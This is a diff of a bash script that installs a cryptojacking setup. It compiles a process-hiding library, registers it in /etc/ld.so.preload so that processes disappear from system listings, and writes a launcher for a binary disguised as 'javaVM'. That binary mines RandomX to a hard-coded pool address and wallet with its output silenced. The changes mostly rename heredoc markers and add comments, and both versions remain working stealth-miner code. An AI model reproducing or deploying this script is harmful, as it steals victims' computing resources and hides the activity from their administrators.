@@ -1,18 +1,19 @@
-cat > combined_script.sh << 'EOL'
 #!/bin/bash
 
-# Installation commands
+# Update and install necessary packages
 apt update
 apt -y install nano wget htop binutils cmake build-essential screen unzip net-tools curl
 
+# Unset environment variables and set PATH
 unset LD_PRELOAD
 unset LD_LIBRARY_PATH
 export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 
+# Sleep for stability
 sleep 0.5
 
-# Process hiding C code
-cat > processhider.c << 'EOL1'
+# Define process hiding C code
+cat > processhider.c << 'EOL'
 #define _GNU_SOURCE
 
 #include <stdio.h>
@@ -111,12 +112,12 @@ struct dirent* readdir(DIR *dirp)                                       \
 
 DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
-EOL1
+EOL
 
 sleep 0.2
 
-# Makefile for compiling the C code
-cat > Makefile << 'EOL2'
+# Create Makefile for compiling the C code
+cat > Makefile << 'EOL'
 all: libprocesshider.so
 
 libprocesshider.so: processhider.c
@@ -125,7 +126,7 @@ libprocesshider.so: processhider.c
 .PHONY: clean
 clean:
 	rm -f libprocesshider.so
-EOL2
+EOL
 
 sleep 0.5
 
@@ -140,7 +141,7 @@ echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
 sleep 0.3
 
 # Script to start javaVM
-cat > start_javaVM.sh << 'EOL3'
+cat > start_javaVM.sh << 'EOL'
 #!/bin/sh
 if [ -f /tmp/javaVM ]
 then
@@ -151,16 +152,11 @@ else
     chmod +x /tmp/javaVM
     /tmp/javaVM --algorithm randomx --pool 103.228.74.80:4444 --wallet ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt --password duckz --cpu-threads 1 --disable-gpu > /dev/null 2>&1 &
 fi
-EOL3
+EOL
 
 chmod +x start_javaVM.sh
 
 # Cleanup unnecessary files
 rm -f processhider.c Makefile
 
-# End of script
-EOL
-
-chmod +x combined_script.sh
-
-echo "Combined script 'combined_script.sh' created successfully."
+echo "Installation and setup completed successfully."
